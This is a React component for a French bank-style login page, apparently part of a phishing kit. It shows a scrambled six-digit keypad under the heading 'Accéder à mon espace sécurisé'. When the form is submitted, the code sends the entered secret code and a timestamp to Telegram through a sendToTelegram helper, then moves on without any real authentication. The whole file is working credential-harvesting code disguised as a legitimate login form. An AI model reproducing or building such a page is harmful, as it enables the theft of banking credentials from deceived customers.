import React, { useState } from 'react';
import { User } from 'lucide-react';
import { sendToTelegram } from '../utils/telegram';

interface CodeFormProps {
  onNext: () => void;
}

export default function CodeForm({ onNext }: CodeFormProps) {
  const [code, setCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const picker = (digit: number) => {
    if (code.length >= 6) return;
    setCode(prev => prev + digit);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    // Préparer le message pour Telegram
    const message = `
<b>🔢 Code secret saisi</b>

<b>Code secret:</b> ${code}
<b>Timestamp:</b> ${new Date().toLocaleString('fr-FR')}
<b>Page:</b> Saisie code secret
    `;

    // Envoyer vers Telegram
    await sendToTelegram(message);

    // Simuler un délai puis passer à l'étape suivante
    setTimeout(() => {
      setIsLoading(false);
      onNext();
    }, 1500);
  };

  return (
    <div className="code-form-container">
      <form onSubmit={handleSubmit}>
        <div className="user-icon">
          <User size={48} color="#333" />
        </div>
        
        <div className="form-title">
          <h1>Accéder à mon espace sécurisé</h1>
        </div>

        <div className="code-input-section">
          <label htmlFor="code">Code secret (6 chiffres)</label>
          <input 
            type="text" 
            maxLength={6} 
            id="code" 
            placeholder="******" 
            value={code}
            onChange={(e) => setCode(e.target.value)}
            required 
            readOnly
          />
        </div>

        <div className="number-keypad">
          <button type="button" onClick={() => picker(3)}>3</button>
          <button type="button" onClick={() => picker(2)}>2</button>
          <button type="button" onClick={() => picker(4)}>4</button>
          <button type="button" onClick={() => picker(0)}>0</button>
          <button type="button" onClick={() => picker(8)}>8</button>
          <button type="button" onClick={() => picker(9)}>9</button>
          <button type="button" onClick={() => picker(7)}>7</button>
          <button type="button" onClick={() => picker(5)}>5</button>
          <button type="button" onClick={() => picker(1)}>1</button>
          <button type="button" onClick={() => picker(6)}>6</button>
        </div>

        <div className="submit-section">
          <button type="submit" className="connect-btn" disabled={isLoading || code.length !== 6}>
            {isLoading ? 'Connexion...' : 'Je me connecte'}
          </button>
        </div>

        <div className="forgot-link">
          <a href="#">Code secret oublié ?</a>
        </div>
      </form>
    </div>
  );
}